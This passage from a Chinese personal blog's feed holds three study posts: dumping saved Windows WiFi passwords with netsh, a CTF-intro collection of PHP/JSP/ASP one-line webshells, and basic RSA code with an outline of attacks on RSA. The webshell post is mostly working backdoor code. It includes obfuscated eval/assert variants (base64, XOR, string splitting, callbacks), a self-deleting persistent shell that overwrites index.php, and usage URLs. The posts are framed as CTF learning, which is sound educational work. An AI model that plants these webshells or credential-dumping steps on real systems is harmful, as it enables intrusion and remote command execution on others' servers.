    <content type="html"><![CDATA[<p>今天在B站看到一个视频，发现能查看电脑连接过的WIFI密码，于是实战一下。</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><ol><li><p>win+R，输入cmd，进入命令行</p></li><li><p>粘贴：<code>netsh wlan export profile key=clear &amp;&amp; type *.xml &gt; 666.txt</code>, 回车。</p></li><li><p>打开C盘-&gt;用户-&gt;当前用户名的文件夹下，拉到后面即可看到xml文件。</p><p><img src="https://i.loli.net/2021/03/13/rFJCT74mgk3M8uA.png" alt="image-20210308180000770"></p><p>打开即可看到WiFi用户名和密码。</p><p><img src="https://i.loli.net/2021/03/13/TdRLmw4VguAokhM.png" alt="image-20210308180059098"></p><p>但是有的WiFi加密了就没办法了。</p><p><img src="https://i.loli.net/2021/03/13/mSMjxNdQTrVfOoX.png" alt="image-20210308180142401"></p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Netsh WLAN show profiles  --- 显示了每个无线适配器在计算机上存储的所有配置文件</span><br><span class="line"></span><br><span class="line">Netsh WLAN show profiles interface&#x3D;&quot;WLAN&quot;  ---显示特定无线适配器的配置文件列表</span><br><span class="line"></span><br><span class="line">Netsh WLAN show drivers ---获取有关计算机的无线适配器的驱动程序信息</span><br><span class="line"></span><br><span class="line">Netsh WLAN show wirelesscapabilities  ---查看所有受支持的无线适配器功能</span><br><span class="line"></span><br><span class="line">Netsh WLAN show interfaces --- 查看特定的无线适配器信息</span><br><span class="line"></span><br><span class="line">Netsh WLAN show profile name&#x3D;&quot;Profile_Name&quot; key&#x3D;clear  ---查看密码  如果您丢失了密码并且忘记了将另一台设备连接到特定Wi-Fi接入点的网络安全密钥，则可以使用以下命令查看网络安全密钥</span><br><span class="line"></span><br><span class="line">Netsh WLAN set profileparameter name&#x3D;&quot;Profile_Name&quot; connectionmode&#x3D;manual   --- 防止计算机自动连接到其他网络，自动停止连接超出的网络</span><br><span class="line"></span><br><span class="line">Netsh WLAN set profileparameter name&#x3D;&quot; Profile_Name&quot; connectionmode&#x3D;auto ---Windows 10将始终优先选择您选择自动连接的那些网络。如果要在优先级列表中向上移动网络</span><br><span class="line"></span><br><span class="line">Netsh WLAN delete profile name&#x3D;&quot;Profile_Name&quot; --- 删除密码和配置</span><br><span class="line"></span><br><span class="line">Netsh WLAN export profile key&#x3D;clear folder&#x3D;&quot;Folder_Path&quot; ---导出所有无线网络配置文件</span><br><span class="line"></span><br><span class="line">Netsh WLAN export profile name&#x3D;&quot;Profile_Name&quot; key&#x3D;clear folder&#x3D;&quot;Folder_Path&quot;   ---导入特定配置</span><br><span class="line"></span><br><span class="line">Netsh WLAN add profile filename&#x3D;&quot;File_Path.XML&quot; ---导入配置</span><br><span class="line"></span><br><span class="line">Netsh WLAN add profile filename&#x3D;&quot;Path_With_Filename.xml&quot; Interface&#x3D;&quot;Wireless Network Connection&quot; user&#x3D;current  --- 将配置文件导入到特定的无线接口而仅导入到当前用户</span><br><span class="line"></span><br><span class="line">Netsh WLAN show WLANreport   --- 创建无线报告  对与接入点的无线连接进行故障排除</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天在B站看到一个视频，发现能查看电脑连接过的WIFI密码，于是实战一下。&lt;/p&gt;
&lt;h1 id=&quot;操作&quot;&gt;&lt;a href=&quot;#操作&quot; class=&quot;headerlink&quot; title=&quot;操作&quot;&gt;&lt;/a&gt;操作&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;win+R，输入cmd，进入命令
      
    
    </summary>
    
    
      <category term="无线安全" scheme="https://ggyggy666.github.io/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WiFi" scheme="https://ggyggy666.github.io/tags/WiFi/"/>
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-一句话木马</title>
    <link href="https://ggyggy666.github.io/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <id>https://ggyggy666.github.io/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</id>
    <published>2021-02-20T10:26:03.000Z</published>
    <updated>2021-03-17T13:36:27.332Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习web的一句话木马。</p><a id="more"></a><h1 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h1><ol><li>木马能上传到服务器。</li><li>上传后能保留并被解析执行。</li><li>知道上传后的路径。</li></ol><h1 id="eval和assert"><a href="#eval和assert" class="headerlink" title="eval和assert"></a>eval和assert</h1><p>assert在PHP7.1之后被废弃了。eval不能被可变函数调用，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; &quot;eval&quot;;</span><br><span class="line">@$a(@$_GET[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="有-和无-的区别"><a href="#有-和无-的区别" class="headerlink" title="有@和无@的区别"></a>有@和无@的区别</h1><p>有@不会显示报错，没有就会显示。比如assert，PHP&gt;7.1之后就废弃了，继续使用会报错，如果用了@</p><p><img src="https://i.loli.net/2021/03/13/ySHiQM8KjouYBZX.png" alt="image-20210220185750212"></p><p>页面一片空白。没有使用@,</p><p><img src="https://i.loli.net/2021/03/13/BM8GYkqF6uvRsTw.png" alt="image-20210220185843443"></p><p>直接报错。</p><h1 id="一句话木马及变种"><a href="#一句话木马及变种" class="headerlink" title="一句话木马及变种"></a>一句话木马及变种</h1><h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&#x2F;&#x2F;用蚁剑连，密码是cmd</span><br><span class="line">&lt;?php @eval(&quot;phpinfo();&quot;);?&gt;&#x2F;&#x2F;PHP探针</span><br></pre></td></tr></table></figure><p>需要注意的是，使用蚁剑连的话需要使用$_POST, 使用$_GET是不行的。$_REQUEST也是可以的。</p><h2 id="使用JS代码"><a href="#使用JS代码" class="headerlink" title="使用JS代码"></a>使用JS代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这个在PHPStudy的环境没有解析成功?</p><h2 id="拆分拼接"><a href="#拆分拼接" class="headerlink" title="拆分拼接"></a>拆分拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;);</span><br><span class="line">$payload &#x3D; $arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];</span><br><span class="line">@$payload(@$_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PHP版本需要小于7.1才能拼接assert, 而拼接eval是不行的。</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">$a($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>同样PHP&lt;7.1。</p><h2 id="随机异或"><a href="#随机异或" class="headerlink" title="随机异或"></a>随机异或</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F;也可以用十六进制进行进一步加密,例如</span><br><span class="line">    &#x2F;&#x2F;$r&#x3D;&quot;x4d&quot;^&quot;x3f&quot;;</span><br><span class="line">    $a&#x3D;&quot;Y&quot;^&quot;8&quot;;&#x2F;&#x2F;a</span><br><span class="line">    $b&#x3D;&quot;T&quot;^&quot;&#39;&quot;;&#x2F;&#x2F;s</span><br><span class="line">    $c&#x3D;&quot;*&quot;^&quot;O&quot;;&#x2F;&#x2F;e</span><br><span class="line">    $d&#x3D;&quot;M&quot;^&quot;?&quot;;&#x2F;&#x2F;r</span><br><span class="line">    $e&#x3D;&quot;-&quot;^&quot;Y&quot;;&#x2F;&#x2F;t</span><br><span class="line">    $payload&#x3D;$a.$b.$b.$c.$d.$e;&#x2F;&#x2F;拼接成assert</span><br><span class="line">    @$payload(@$_POST[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a&#x3D;&#39;assert&#39;;</span><br><span class="line">    $b&#x3D;&#39;a&#39;;</span><br><span class="line">    &#x2F;&#x2F;$$b&#x3D;$a&#x3D;&#39;assert&#39;</span><br><span class="line">    $$b($_POST[&#39;x&#39;]); &#x2F;&#x2F;assert($_POST[&#39;x&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]);</span><br><span class="line">&#x2F;&#x2F;传入e&#x3D;assert&amp;x&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="使用回调函数"><a href="#使用回调函数" class="headerlink" title="使用回调函数"></a>使用回调函数</h2><p>使用到：<code>call_user_func($callback, $parameter)</code>，$callback是回调函数名称，parameter是参数。使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> @call_user_func($_GET[&#39;id&#39;],$_GET[&#39;a&#39;]);</span><br><span class="line"> &#x2F;&#x2F;传入id&#x3D;eval&amp;a&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220191447775.png" alt="image-20210220191447775"></p><p>报错了？？</p><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file &#x3D; &#39;.&#x2F;index.php&#39;;</span><br><span class="line">$code &#x3D; &#39;&lt;?php if($_GET[&quot;pass&quot;]&#x3D;&#x3D;&quot;ggy&quot;)&#123;@eval($_GET[&quot;cmd&quot;]);&#125; ?&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F;pass&#x3D;nepnep 用法：pass&#x3D;nepnep&amp;cmd&#x3D;command</span><br><span class="line">file_put_contents($file,$code);</span><br><span class="line">usleep(5000);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>ignore_user_abort(true): 设置成true，断开连接仍然执行一句话。</li><li>set_time_limit(0): 0表示没有限制。</li><li><code>unlink(__FILE__)</code>:  删除文件自身。</li><li>usleep(): 延迟执行当前脚本。</li></ul><p><img src="https://i.loli.net/2021/03/13/lkRABf1MeqhOLu7.png" alt="image-20210220191950219"></p><p>崩了。。</p><p>之后访问:<code>xxx/index.php?pass=ggy&amp;cmd=phpinfo();</code>即可。</p><h2 id="利用函数和类"><a href="#利用函数和类" class="headerlink" title="利用函数和类"></a>利用函数和类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function ggy($a)&#123;</span><br><span class="line">assert($a);</span><br><span class="line">&#125;</span><br><span class="line">@ggy($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ggy&#123;</span><br><span class="line">public $a&#x3D;&#39;&#39;;</span><br><span class="line">function __destruct()&#123;</span><br><span class="line">assert(&quot;this-&gt;$a&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;new ggy();</span><br><span class="line">$b-&gt;a&#x3D;$_POST[&#39;cmd&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;filename&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$d&#x3D;&#39;data&#39;;</span><br><span class="line">$$d&#x3D;$_GET[&#39;text&#39;];  &#x2F;&#x2F;$data</span><br><span class="line">$f&#x3D;&#39;fp&#39;;</span><br><span class="line">$$f&#x3D;fopen($_GET[&#39;filename&#39;],&#39;wb&#39;);  &#x2F;&#x2F;$fp</span><br><span class="line">echo fwrite($fp,$data)?&quot;save success&quot;:&quot;save fail&quot;;</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问：<code>/word1.php?filename=ggy.php&amp;text=&lt;?%20phpinfo();?&gt;</code>, 在目录下生成ggy.php。访问即可。</p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @preg_replace(&quot;&#x2F;abcd&#x2F;e&quot;,$_GET[&#39;a&#39;],&quot;abcdefg&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>PHP新版本不支持了。用的是preg_replace_callback()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function test()&#123;</span><br><span class="line">eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace_callback(&quot;&#x2F;abcd&#x2F;&quot;,test,&quot;abcde&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>匹配到就调用test。访问:<code>xxx.php?cmd=phpinfo();</code></p><h2 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; str_replace(&quot;b&quot;, &quot;&quot;, &quot;absbsbebrbt&quot;);</span><br><span class="line">$a($_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="pares-str"><a href="#pares-str" class="headerlink" title="pares_str"></a>pares_str</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $str &#x3D; &quot;a&#x3D;assert&quot;;                  parse_str($str);</span><br><span class="line">    $a($_POST[&#39;hacker&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="substr-replace"><a href="#substr-replace" class="headerlink" title="substr_replace"></a>substr_replace</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);</span><br><span class="line">@$a($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="短木马"><a href="#短木马" class="headerlink" title="短木马"></a>短木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;phpinfo()?&gt;</span><br></pre></td></tr></table></figure><h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;0&quot;));%&gt;</span><br></pre></td></tr></table></figure><h2 id="ASP木马"><a href="#ASP木马" class="headerlink" title="ASP木马"></a>ASP木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(&quot;0&quot;))%&gt;</span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://blog.csdn.net/weixin_46270220/article/details/113745113" target="_blank" rel="noopener">https://blog.csdn.net/weixin_46270220/article/details/113745113</a></p><p><a href="https://www.cnblogs.com/white-album2/p/9851468.html" target="_blank" rel="noopener">https://www.cnblogs.com/white-album2/p/9851468.html</a></p><p>涅普的PPT</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天学习web的一句话木马。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-一句话木马" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-crypt（二）</title>
    <link href="https://ggyggy666.github.io/2021/02/16/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/02/16/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-02-16T03:17:35.000Z</published>
    <updated>2021-03-17T13:36:22.642Z</updated>
    
    <content type="html"><![CDATA[<p>今天主要学习RSA。</p><a id="more"></a><h1 id="简单实现RSA"><a href="#简单实现RSA" class="headerlink" title="简单实现RSA"></a>简单实现RSA</h1><h2 id="求逆元"><a href="#求逆元" class="headerlink" title="求逆元"></a>求逆元</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">d &#x3D; invert(e, (p-1)*(q-1))</span><br></pre></td></tr></table></figure><h2 id="判断素数"><a href="#判断素数" class="headerlink" title="判断素数"></a>判断素数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">print(isPrime(7))</span><br></pre></td></tr></table></figure><h2 id="求最大公因数"><a href="#求最大公因数" class="headerlink" title="求最大公因数"></a>求最大公因数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">print(GCD(12, 18))&#x2F;&#x2F;6</span><br></pre></td></tr></table></figure><h2 id="开n次方根"><a href="#开n次方根" class="headerlink" title="开n次方根"></a>开n次方根</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import iroot</span><br><span class="line">print(iroot(4, 2))&#x2F;&#x2F;对4开平方根</span><br></pre></td></tr></table></figure><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">m &#x3D; 123456</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">p, q &#x3D; getPrime(128), getPrime(128)</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">c &#x3D; pow(m, e, n)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><h2 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p &#x3D; </span><br><span class="line">q &#x3D; </span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; </span><br><span class="line">d &#x3D; inverse(e, (p-1)*(q-1))</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h1 id="使用RSA通信"><a href="#使用RSA通信" class="headerlink" title="使用RSA通信"></a>使用RSA通信</h1><h2 id="Alice发送公钥给Bob"><a href="#Alice发送公钥给Bob" class="headerlink" title="Alice发送公钥给Bob"></a>Alice发送公钥给Bob</h2><p>首先生成两个素数p和q, 相乘得到n, 然后随机生成一个小于n的素数e, 计算出e关于(p-1)*(q-1)的逆元作为密钥d。将(e, n)作为公钥发送给Bob，私钥d自己保留。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">e &#x3D; 65537</span><br><span class="line">p, q &#x3D; getPrime(128), getPrime(128)</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">d &#x3D; inverse(e, (p-1)*(q-1))</span><br><span class="line">print(&quot;n&#x3D;&quot;, n)</span><br><span class="line">print(&quot;d&#x3D;&quot;, d)</span><br></pre></td></tr></table></figure><h2 id="Bob使用Alice的公钥加密"><a href="#Bob使用Alice的公钥加密" class="headerlink" title="Bob使用Alice的公钥加密"></a>Bob使用Alice的公钥加密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">e &#x3D; 65537</span><br><span class="line">n &#x3D; </span><br><span class="line">m &#x3D; 123456&#x2F;&#x2F;明文</span><br><span class="line">c &#x3D; pow(m, e, n)&#x2F;&#x2F;密文</span><br><span class="line">print(&quot;c&#x3D;&quot;, c)</span><br></pre></td></tr></table></figure><h2 id="Alice使用私钥解密"><a href="#Alice使用私钥解密" class="headerlink" title="Alice使用私钥解密"></a>Alice使用私钥解密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">d &#x3D; </span><br><span class="line">n &#x3D; </span><br><span class="line">c &#x3D; </span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">print(&quot;m&#x3D;&quot;, m)</span><br></pre></td></tr></table></figure><h1 id="攻击加密算法"><a href="#攻击加密算法" class="headerlink" title="攻击加密算法"></a>攻击加密算法</h1><p>第三方窃听通信流程，就只能获取到Alice的公钥(e, n)和Bob发送的密文c。</p><h2 id="分解素因数攻击"><a href="#分解素因数攻击" class="headerlink" title="分解素因数攻击"></a>分解素因数攻击</h2><p>需要知道私钥d, 而d是e关于(p-1)*(q-1)的逆元，因此需要知道φ(n)，也就是得知道n的素因数分解。</p><p>在线分解网站：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.alpertron.com.ar&#x2F;ECM.HTM</span><br><span class="line">http:&#x2F;&#x2F;www.factordb.com&#x2F;index.php</span><br></pre></td></tr></table></figure><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>使用了相同的n对相同的明文m进行加密。</p><p><img src="https://i.loli.net/2021/02/16/oxm2z8QLadEYU5k.png" alt="image-20210216114535541"></p><h2 id="已知p-q或p-q"><a href="#已知p-q或p-q" class="headerlink" title="已知p+q或p-q"></a>已知p+q或p-q</h2><p>或者其它p,q之间的关系。解方程组：<br>$$<br>p*q = n,</p><p>p+q = a<br>$$<br>使用SageMath解方程组。<br>$$<br>var(‘p q’), </p><p>solve([p*q==n, p+q==a], [p, q])<br>$$</p><h2 id="小公钥指数攻击"><a href="#小公钥指数攻击" class="headerlink" title="小公钥指数攻击"></a>小公钥指数攻击</h2><p>e很小，c就可能被枚举出来。存在一个k, 满足：m<sup>e</sup>=c + k<em>n. 如果e=3, 那么：</em>m<sup>3</sup> = c + k*n, 枚举k并开根，能够刚好开根的就是解。</p><h2 id="已知e-d分解n"><a href="#已知e-d分解n" class="headerlink" title="已知e, d分解n"></a>已知e, d分解n</h2><p><img src="https://i.loli.net/2021/02/16/Epd2OZgnY4S1QWm.png" alt="image-20210216115428443"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天主要学习RSA。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-crypt（二）" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-crypt（一）</title>
    <link href="https://ggyggy666.github.io/2021/02/15/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypto%EF%BC%88%E4%B8%80%EF%BC%89/"/>
